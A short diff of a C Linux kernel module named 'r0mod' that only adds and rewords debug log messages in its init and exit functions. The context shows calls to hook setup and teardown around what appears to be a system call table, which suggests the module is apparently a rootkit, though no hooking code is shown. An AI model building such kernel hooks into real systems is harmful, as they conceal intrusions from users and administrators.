@@ -76,17 +76,20 @@ static int __init r0mod_init(void)
 
     init_hooks();
 
+    DEBUG("Module started...\n");
+
     return 0;
 }
 
 static void __exit r0mod_exit(void)
 {
+    DEBUG("Module exiting...\n");
     if(sct != NULL)
     {
         exit_hooks();
     }
 
-    DEBUG("Module ended...\n");
+    DEBUG("Module exited...\n");
 }
 
 module_init(r0mod_init);
